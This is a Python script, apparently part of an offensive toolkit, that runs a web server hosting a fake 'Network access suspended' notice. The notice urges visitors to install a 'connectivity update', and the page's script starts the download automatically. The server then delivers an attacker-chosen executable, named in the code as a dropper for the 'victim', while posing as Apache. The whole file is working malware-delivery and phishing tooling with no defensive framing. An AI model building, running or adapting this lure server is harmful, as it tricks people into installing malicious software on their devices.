# netkit/payload_server.py — lure page + dropper served on port 80.
# Windows: binding :80 needs an admin shell.
import argparse
import os
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PAGE = """<!doctype html>
<html><head><meta charset="utf-8"><title>Network Notice</title>
<style>
body{{margin:0;font-family:Segoe UI,Arial,sans-serif;background:#0f172a;color:#e5e7eb;
display:flex;align-items:center;justify-content:center;height:100vh}}
.card{{background:#111827;border:1px solid #1f2937;border-radius:12px;padding:36px 40px;
max-width:460px;box-shadow:0 20px 60px rgba(0,0,0,.5)}}
h1{{font-size:20px;margin:0 0 8px}}p{{color:#9ca3af;font-size:14px;line-height:1.5}}
a.btn{{display:inline-block;margin-top:18px;padding:12px 22px;background:#2563eb;color:#fff;
border-radius:8px;text-decoration:none;font-weight:600}}
small{{color:#6b7280;display:block;margin-top:14px;font-size:12px}}
</style></head><body><div class="card">
<h1>Network access suspended</h1>
<p>Your device was flagged by the gateway. A required connectivity update must be
installed to restore internet access.</p>
<a class="btn" id="dl" href="/{name}" download>Download update</a>
<small>File: {name} &mdash; run it to complete the update.</small>
</div>
<script>
// poke the download the moment the page opens; the button is the fallback
setTimeout(function(){{var a=document.getElementById('dl');a.click();}},700);
</script></body></html>"""


class Handler(BaseHTTPRequestHandler):
    server_version = "Apache/2.4.41"
    file_path = ""
    file_name = ""

    def _send(self, code, body, ctype="text/html; charset=utf-8", extra=None):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = self.path.split("?")[0].lower()
        ip = self.client_address[0]
        if path.endswith("/" + self.file_name.lower()) or path in (
            "/update",
            "/download",
            "/setup",
        ):
            if not os.path.isfile(self.file_path):
                self._send(404, b"not found")
                return
            with open(self.file_path, "rb") as f:
                data = f.read()
            print("[serve] %s -> dropper (%d bytes)" % (ip, len(data)))
            self._send(
                200,
                data,
                "application/octet-stream",
                {"Content-Disposition": 'attachment; filename="%s"' % self.file_name},
            )
            return
        print("[serve] %s -> lure" % ip)
        self._send(200, PAGE.format(name=self.file_name).encode())

    def log_message(self, *a):
        pass


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--file", required=True, help="dropper to serve (exe)")
    ap.add_argument("--name", default="", help="filename shown to the victim")
    ap.add_argument("--port", type=int, default=80)
    args = ap.parse_args()

    Handler.file_path = os.path.abspath(args.file)
    Handler.file_name = args.name or os.path.basename(args.file)
    srv = ThreadingHTTPServer(("0.0.0.0", args.port), Handler)
    print("[server] :%d serving %s as %s" % (args.port, Handler.file_path, Handler.file_name))
    srv.serve_forever()


if __name__ == "__main__":
    main()
